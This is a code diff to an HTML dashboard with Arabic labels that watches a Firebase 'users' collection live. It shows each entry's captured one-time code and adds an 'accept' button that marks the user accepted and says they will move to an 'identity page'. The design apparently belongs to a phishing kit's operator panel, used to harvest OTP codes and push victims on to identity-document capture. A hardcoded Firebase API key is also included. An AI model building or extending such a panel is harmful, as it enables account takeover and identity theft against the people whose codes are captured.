@@ -22,7 +22,6 @@
         .reject { background: #dc3545; color: white; }
         .reject:hover { background: #c82333; transform: scale(1.05); }
         .no-data { text-align: center; padding: 100px 20px; color: #888; background: white; border-radius: 15px; }
-        .status-badge { font-size: 12px; padding: 2px 8px; border-radius: 20px; background: #eee; color: #666; margin-right: 10px; }
     </style>
 </head>
 <body>
@@ -36,8 +35,7 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
-    // أضفنا query و orderBy هنا
-    import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
+    import { getFirestore, collection, onSnapshot, query, orderBy, doc, deleteDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-firestore.js";
 
     const firebaseConfig = {
       apiKey: "AIzaSyC05uAGTFE_mZyByFBTRexYn5VbTfzW0Go",
@@ -50,11 +48,9 @@
 
     const app = initializeApp(firebaseConfig);
     const db = getFirestore(app);
-
     const dataList = document.getElementById('dataList');
 
-    // --- التعديل الجوهري هنا ---
-    // نقوم بعمل استعلام يرتب حسب الوقت (timestamp) بشكل تنازلي (desc)
+    // الاستعلام عن المستخدمين مرتبين بالأحدث
     const q = query(collection(db, "users"), orderBy("timestamp", "desc"));
 
     onSnapshot(q, (snapshot) => {
@@ -77,11 +73,17 @@
                     <div>الرمز: <span class="otp">${data.otp || 'بانتظار...'}</span></div>
                 </div>
                 <div class="actions">
-                    <button class="btn accept" onclick="alert('تم القبول')">قبول ✅</button>
+                    <button class="btn accept" id="acceptBtn_${id}" data-id="${id}">قبول ✅</button>
                     <button class="btn reject" data-id="${id}">حذف ❌</button>
                 </div>
             `;
             dataList.appendChild(card);
+
+            // ربط حدث القبول
+            document.getElementById(`acceptBtn_${id}`).onclick = async () => {
+                await updateDoc(doc(db, "users", id), { status: "accepted" });
+                alert("تم قبول المستخدم، سينتقل الآن لصفحة الهوية");
+            };
         });
 
         // تفعيل زر الحذف
@@ -95,7 +97,6 @@
         });
     });
 </script>
-
 
 </body>
 </html>
